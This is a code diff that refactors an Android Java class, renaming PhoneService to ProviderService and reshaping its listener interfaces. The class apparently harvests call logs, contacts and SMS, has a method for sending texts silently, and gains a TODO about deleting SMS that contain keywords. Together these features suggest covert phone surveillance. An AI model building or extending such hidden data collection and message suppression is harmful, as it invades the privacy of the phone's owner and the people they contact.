@@ -16,7 +16,7 @@ import android.text.TextUtils;
 
 import com.fs.fs.bean.PhoneInfo;
 import com.fs.fs.bean.SMSInfo;
-import com.fs.fs.receiver.SMSReceiver;
+import com.fs.fs.receivers.SMSReceiver;
 import com.fs.fs.utils.Constant;
 import com.fs.fs.utils.DateUtils;
 import com.fs.fs.utils.LogUtils;
@@ -29,14 +29,15 @@ import java.util.List;
  * Created by wyx on 2016/12/30.
  */
 
-public class PhoneService {
-    //TODO: 监听Call/通讯记录 & 通讯录 ContactsContentObserver
+public class ProviderService {
+    //TODO: 监听Call/通讯记录 & 通讯录 ContentObserver
+    //TODO: 删除关键词短信
     private Context mContext = null;
     private SharePreferencesUtils mSharePreferences = null;
     // 获取内容解析者
     private ContentResolver mResolver = null;
 
-    public PhoneService(Context context) {
+    public ProviderService(Context context) {
         this.mContext = context;
         this.mSharePreferences = SharePreferencesUtils.getInstance(context);
         this.mResolver = mContext.getContentResolver();
@@ -48,10 +49,14 @@ public class PhoneService {
         void onReceive(SMSInfo msgInfo);
     }
 
-    public interface CallListener {
+    public interface CallsListener {
         void onGetAllCall(List<PhoneInfo> callInfo);
 
-        void onReceive(SMSInfo msgInfo);
+        void onStrart();
+
+        void onFinish();
+
+        Boolean onPhoneNumber(String number);
     }
 
     public interface ContactsListener {
@@ -59,9 +64,8 @@ public class PhoneService {
     }
 
     public SMSListener mSMSListener;
-    public CallListener mCallListener;
+    public CallsListener mCallsListener;
     public ContactsListener mContactsListener;
-
 
     public void sendSMSSilent(String phoneNumber, String content) {
         if (TextUtils.isEmpty(content)) return;
@@ -136,8 +140,8 @@ public class PhoneService {
         mContactsListener.onGetAllContacts(infos);
     }
 
-    public void getCalls(CallListener listener) {
-        mCallListener = listener;
+    public void getCalls(CallsListener listener) {
+        mCallsListener = listener;
         if (ActivityCompat.checkSelfPermission(mContext, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
             // 检查READ_CALL_LOG权限
             return;
@@ -173,7 +177,7 @@ public class PhoneService {
                 }
             }
             cursor.close();
-            mCallListener.onGetAllCall(infos);
+            mCallsListener.onGetAllCall(infos);
             LogUtils.d("%s", infos.size());
         }
     }
